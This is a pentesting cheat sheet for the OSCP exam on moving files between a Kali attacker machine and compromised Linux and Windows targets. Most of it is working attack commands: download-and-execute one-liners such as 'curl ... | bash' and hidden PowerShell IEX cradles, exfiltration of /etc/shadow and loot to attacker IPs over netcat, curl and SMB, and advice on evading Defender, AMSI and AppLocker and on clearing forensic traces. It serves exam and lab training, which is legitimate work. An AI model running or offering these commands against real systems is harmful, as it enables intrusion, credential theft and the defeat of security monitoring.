# File Transfers

Comprehensive playbook for moving files between attacker (Kali) and target (Linux/Windows) during the OSCP exam.

---

## Table of Contents
1. [Decision Tree — Which Method?](#decision-tree)
2. [Setting Up Servers on Kali](#kali-servers)
3. [Linux Target — Download To](#linux-download)
4. [Linux Target — Upload From](#linux-upload)
5. [Windows Target — Download To](#windows-download)
6. [Windows Target — Upload From](#windows-upload)
7. [Encoding & Inline Transfers (no server needed)](#inline)
8. [SMB / FTP / TFTP Servers](#smb-ftp-tftp)
9. [Gotchas & Troubleshooting](#gotchas)
10. [Quick-Reference Cheat Card](#cheatcard)

---

<a id="decision-tree"></a>
## 1. Decision Tree — Which Method?

| Situation | Best First Try |
|-----------|---------------|
| Linux target, outbound HTTP allowed | `wget` / `curl` from Python `http.server` |
| Windows 10/Server 2016+ target | `certutil` or PowerShell `Invoke-WebRequest` |
| Old Windows (XP/2003/7) no PS | `certutil`, `bitsadmin`, TFTP |
| Egress filtered, only SMB out | `impacket-smbserver` + `copy \\IP\share\file` |
| Only one port (e.g. 80) reachable inbound on attacker | HTTP server on 80, may need `sudo` |
| Need to exfil a small file inline | base64 → paste into shell |
| Need to exfil a binary inline | base64 then `base64 -d` |
| No tools on target at all | bash `/dev/tcp` or PowerShell socket |

**Rule of thumb:** Always try `wget`/`curl` first on Linux, `certutil` first on Windows. They almost always work.

---

<a id="kali-servers"></a>
## 2. Setting Up Servers on Kali

### Python HTTP server (most common)
```bash
# Python 3 — serves current directory on port 80
sudo python3 -m http.server 80

# Non-privileged port (no sudo)
python3 -m http.server 8000

# Python 2 (legacy)
python2 -m SimpleHTTPServer 80
```

**Gotcha:** Port <1024 requires `sudo`. If you forget, you get `Permission denied`. Use 8000 or 8080 unless target firewall forces 80/443.

### Python HTTPS server (when HTTP is blocked)
```bash
# Generate cert
openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# Serve
python3 -c "import http.server, ssl; s=http.server.HTTPServer(('0.0.0.0',443),http.server.SimpleHTTPRequestHandler); s.socket=ssl.wrap_socket(s.socket,certfile='server.pem',server_side=True); s.serve_forever()"
```

### Quick PHP server
```bash
php -S 0.0.0.0:8000
```

### Updog (HTTP server with upload support — very useful)
```bash
pip3 install updog
updog                       # default :9090
updog -p 80 --password hunter2
# Browse to http://kali:9090 to drag-drop uploads
```

### Impacket SMB server (huge on Windows targets)
```bash
# Anonymous share named "share" serving current dir
impacket-smbserver share $(pwd) -smb2support

# With creds (avoid SMBv1 auth issues on modern Windows)
impacket-smbserver share $(pwd) -smb2support -username user -password pass
```

**Gotcha:** Without `-smb2support`, Windows 10/Server 2016+ refuse the connection.
**Gotcha:** Windows 10 1709+ disables anonymous SMB by default — use credentials.

### Netcat as a file receiver
```bash
# Receive a file (attacker)
nc -lvnp 4444 > received.bin
# Send (target)
nc ATTACKER 4444 < /etc/passwd
# OR with timeout-based close
nc -q 1 ATTACKER 4444 < file
```

---

<a id="linux-download"></a>
## 3. Linux Target — Download To Target

### wget
```bash
wget http://10.10.14.5/linpeas.sh
wget http://10.10.14.5/linpeas.sh -O /tmp/lp.sh    # rename
wget -q http://10.10.14.5/file                     # quiet
wget --no-check-certificate https://10.10.14.5/x   # skip TLS verify
```

### curl
```bash
curl http://10.10.14.5/linpeas.sh -o linpeas.sh
curl -O http://10.10.14.5/file.tar               # keeps original name
curl -k https://10.10.14.5/file                  # skip TLS
curl -s URL | bash                                # pipe straight to shell
```

### Pure-bash (no external tools)
```bash
# /dev/tcp — built into bash
exec 3<>/dev/tcp/10.10.14.5/80
echo -e "GET /file HTTP/1.0\r\nHost: x\r\n\r\n" >&3
cat <&3 > file
```

### Other fallbacks
```bash
# Using python
python -c "import urllib.request; urllib.request.urlretrieve('http://IP/f','/tmp/f')"
python -c "import urllib; urllib.urlretrieve('http://IP/f','/tmp/f')"    # py2

# fetch (BSD/freeBSD)
fetch http://IP/file

# SCP from attacker
scp file user@target:/tmp/

# Base64 paste (see Section 7)
```

---

<a id="linux-upload"></a>
## 4. Linux Target — Upload From Target (exfil)

```bash
# To nc listener
nc 10.10.14.5 4444 < /etc/shadow

# To updog
curl -F 'file=@/etc/passwd' http://10.10.14.5:9090/upload

# SCP
scp /etc/passwd kali@10.10.14.5:/tmp/

# Inline base64
base64 -w0 /etc/shadow                # then copy-paste to attacker
```

---

<a id="windows-download"></a>
## 5. Windows Target — Download To Target

### PowerShell — Invoke-WebRequest (PS 3.0+ / Win8+)
```powershell
# Basic
Invoke-WebRequest -Uri http://10.10.14.5/nc.exe -OutFile C:\Windows\Temp\nc.exe

# Short aliases
iwr http://10.10.14.5/nc.exe -o nc.exe
iwr -useb http://10.10.14.5/x.ps1 | iex     # download + execute in memory

# Skip TLS errors
[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

**Gotcha:** `Invoke-WebRequest` is **slow** on Windows because of the IE engine loading. For large files, prefer `(New-Object Net.WebClient).DownloadFile()`.

### PowerShell — WebClient (fastest, works PS 2.0+)
```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/nc.exe','C:\Windows\Temp\nc.exe')

# Read string into memory (in-memory exec — AMSI/AV often miss this)
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerView.ps1')

# Common one-liner pattern
powershell -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/inv.ps1')"
```

### PowerShell flags — what every flag does
| Flag | Meaning |
|------|---------|
| `-nop` / `-NoProfile` | Skip the user PS profile (prevents tracing/alerts) |
| `-ep bypass` / `-ExecutionPolicy Bypass` | Ignore script signing/execution policy |
| `-w hidden` / `-WindowStyle Hidden` | No console window pops |
| `-c "..."` | Inline command |
| `-enc <b64>` | Base64 UTF-16LE encoded command (see Section 7) |
| `-NonInteractive` | No prompts |
| `-File C:\x.ps1` | Run a script |

**Canonical safe one-liner:** `powershell -nop -w hidden -ep bypass -c "<cmd>"`

### certutil (works XP → Server 2022)
```cmd
certutil -urlcache -split -f http://10.10.14.5/nc.exe nc.exe
certutil -urlcache -split -f http://10.10.14.5/nc.exe C:\Windows\Temp\nc.exe

# Clear the URL cache after (forensics hygiene)
certutil -urlcache -split -f http://10.10.14.5/nc.exe delete
```

**Gotcha:** Modern Defender flags `certutil` downloading EXEs — use HTTPS to a non-suspicious-looking URL or rename payload to `.txt` and rename after download.

### bitsadmin (legacy but still on Win7-Server2022)
```cmd
bitsadmin /transfer myjob /download /priority high http://10.10.14.5/nc.exe C:\Windows\Temp\nc.exe
```

### cmd.exe — built-in (Windows 10 1803+ has curl + tar)
```cmd
curl http://10.10.14.5/nc.exe -o nc.exe
curl -k https://10.10.14.5/x -O
```

### Windows TFTP client (legacy)
```cmd
tftp -i 10.10.14.5 GET nc.exe
```
**Gotcha:** TFTP client is not installed by default on Win8+. Use `pkgmgr /iu:"TFTP"` if you have admin (you usually don't pre-priv-esc).

### Old-school VBS/JS download
```cmd
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >> wget.vbs
echo objXMLHTTP.open "GET", strUrl, false >> wget.vbs
echo objXMLHTTP.send() >> wget.vbs
echo Set oStream = CreateObject("ADODB.Stream") >> wget.vbs
echo oStream.Open >> wget.vbs
echo oStream.Type = 1 >> wget.vbs
echo oStream.Write objXMLHTTP.responseBody >> wget.vbs
echo oStream.SaveToFile StrFile, 2 >> wget.vbs
echo oStream.Close >> wget.vbs
cscript wget.vbs http://10.10.14.5/nc.exe nc.exe
```

### SMB pull (no HTTP needed)
```cmd
copy \\10.10.14.5\share\nc.exe C:\Windows\Temp\nc.exe
\\10.10.14.5\share\winPEAS.exe                  # execute directly
```

---

<a id="windows-upload"></a>
## 6. Windows Target — Upload From Target (exfil)

### To SMB share (write-enabled impacket-smbserver)
```cmd
copy C:\Users\Bob\Desktop\flag.txt \\10.10.14.5\share\
```

### PowerShell POST
```powershell
$f=Get-Content C:\loot.txt -Raw
Invoke-WebRequest -Uri http://10.10.14.5:8000/up -Method POST -Body $f
```

### Updog upload
```powershell
curl.exe -F 'file=@C:\loot.zip' http://10.10.14.5:9090/upload
```

### Netcat
```cmd
nc.exe 10.10.14.5 4444 < C:\loot.txt
```

---

<a id="inline"></a>
## 7. Encoding & Inline Transfers (no network server)

When you have a shell but file transfer infra is blocked, paste the file.

### Base64 — Linux to Linux
```bash
# Attacker — encode
base64 -w0 mybinary > b64.txt
# Paste into target shell:
echo "<b64string>" | base64 -d > mybinary
chmod +x mybinary
```

### Base64 — to Windows (PowerShell)
```powershell
# Decode pasted text
[IO.File]::WriteAllBytes("C:\Temp\nc.exe",[Convert]::FromBase64String("<b64>"))
```

### PowerShell `-EncodedCommand`
```bash
# Attacker — encode UTF-16LE then base64
cmd='IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.5/r.ps1")'
echo -n "$cmd" | iconv -t UTF-16LE | base64 -w0
```
```cmd
powershell -nop -w hidden -enc <BASE64_BLOB>
```
**Gotcha:** Encoding must be **UTF-16LE** — UTF-8 base64 will silently fail or run garbage.

### xxd hex round-trip (when base64 is filtered)
```bash
xxd -p mybin > hex.txt
# target:
xxd -r -p hex.txt > mybin
```

### Bash hex one-liner
```bash
printf '\x7fELF\x02\x01...' > /tmp/x
```

---

<a id="smb-ftp-tftp"></a>
## 8. SMB / FTP / TFTP Servers (alternate channels)

### Impacket SMB (recap)
```bash
impacket-smbserver share $(pwd) -smb2support
# From Windows: copy \\10.10.14.5\share\file .
```

### Python FTP (pyftpdlib)
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21 -w        # -w = anonymous write
```
```cmd
ftp 10.10.14.5
> anonymous
> binary
> get nc.exe
> put loot.zip
```

### TFTP server (atftpd)
```bash
sudo apt install atftpd
sudo mkdir /tftp && sudo chmod 777 /tftp
sudo atftpd --daemon --port 69 /tftp
```

**Gotcha:** TFTP is UDP — easy to forget firewall rules. Used mostly for old embedded/router targets.

---

<a id="gotchas"></a>
## 9. Gotchas & Troubleshooting

### Universal
- **Tun0 vs eth0** — VPN labs use `tun0`. Run `ip a` and confirm the IP you put in commands matches the **interface the target can reach**. A common mistake is serving on the wrong interface and wondering why nothing connects.
- **iptables / firewalls on Kali** — `sudo ufw status`. If active, allow your port: `sudo ufw allow 80`.
- **Two servers, same port** — `Address already in use`. `sudo ss -tlnp | grep :80` to find the offender.
- **File served but 404** — Wrong directory. `python3 -m http.server` serves the **CWD**.
- **Slow transfer** — Try SMB (impacket) instead of HTTP, especially over VPN.

### Windows-specific
- **PowerShell execution policy** — Bypass with `-ep bypass`, or set per-session: `Set-ExecutionPolicy -Scope Process Bypass`. Per-process bypass survives `iex`.
- **AMSI** — Defender hooks PowerShell. If a known tool gets blocked, try the in-memory `IEX(... DownloadString ...)` pattern with an obfuscated copy, or use a non-PS method (`certutil`).
- **Defender ATP** — `nc.exe`, `mimikatz.exe` are signature-blocked by name. Rename to `not_nc.exe`, but the file hash is also signatured. Use compiled-from-source variants or known unsigged builds (e.g., `nc64.exe` from Nishang, `mimi.exe`).
- **PowerShell version** — `$PSVersionTable`. PS 2.0 lacks `Invoke-WebRequest`. Fall back to `Net.WebClient` or `certutil`.
- **Constrained Language Mode** — `$ExecutionContext.SessionState.LanguageMode`. If `ConstrainedLanguage`, most COM objects are blocked. Bypass via `runas` to a non-restricted user or via Office macros.
- **AppLocker / WDAC** — May block writing to `C:\Windows\Temp`. Try `C:\Users\Public\` or `C:\Windows\Tasks\` (often writeable).
- **64 vs 32-bit shell** — A 32-bit PowerShell on 64-bit Windows is in `C:\Windows\SysWOW64\WindowsPowerShell\`. Use `C:\Windows\Sysnative\WindowsPowerShell\v1.0\powershell.exe` to spawn the **64-bit** one from a 32-bit context. Same trick for `cmd.exe`. Matters for tools that need 64-bit (mimikatz x64).

### Linux-specific
- **No `wget` AND no `curl`** — Use `/dev/tcp`, `python`, `perl`, or `nc`.
- **Restricted shell** — `rbash`, no `cd`. Get a proper shell first (Section: Reverse Shells → upgrade).
- **Read-only `/tmp`** — Some hardened boxes mount `/tmp` noexec. Use `/dev/shm` or `/var/tmp`.
- **chmod missing** — `chmod +x` blocked? Run with the interpreter: `bash file.sh`, `python file.py`.

### File-integrity sanity checks
```bash
# Attacker
md5sum file.bin
# Target
certutil -hashfile file.bin MD5      # Windows
md5sum file.bin                       # Linux
```
Always hash large/binary transfers — silent corruption over copy-paste/base64 is common.

---

<a id="cheatcard"></a>
## 10. Quick-Reference Cheat Card

```text
ATTACKER (Kali)
  sudo python3 -m http.server 80
  impacket-smbserver share $(pwd) -smb2support
  nc -lvnp 4444 > out                       (receive file)

LINUX TARGET — download
  wget http://IP/f -O /tmp/f
  curl http://IP/f -o /tmp/f
  exec 3<>/dev/tcp/IP/80 ; ...              (no tools)

WINDOWS TARGET — download
  certutil -urlcache -split -f http://IP/f f
  curl http://IP/f -o f                     (Win10 1803+)
  powershell -nop -ep bypass -c "(New-Object Net.WebClient).DownloadFile('http://IP/f','C:\Windows\Temp\f')"
  powershell -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://IP/x.ps1')"
  copy \\IP\share\f .                       (SMB)
  bitsadmin /transfer j http://IP/f C:\Windows\Temp\f

EXFIL
  curl -F 'file=@loot' http://IP:9090/upload
  copy loot \\IP\share\
  nc IP 4444 < loot
  base64 -w0 loot                           (paste back)
```

**Golden one-liner (Windows):**
`powershell -nop -w hidden -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/x.ps1')"`

**Golden one-liner (Linux):**
`curl http://10.10.14.5/linpeas.sh | bash`
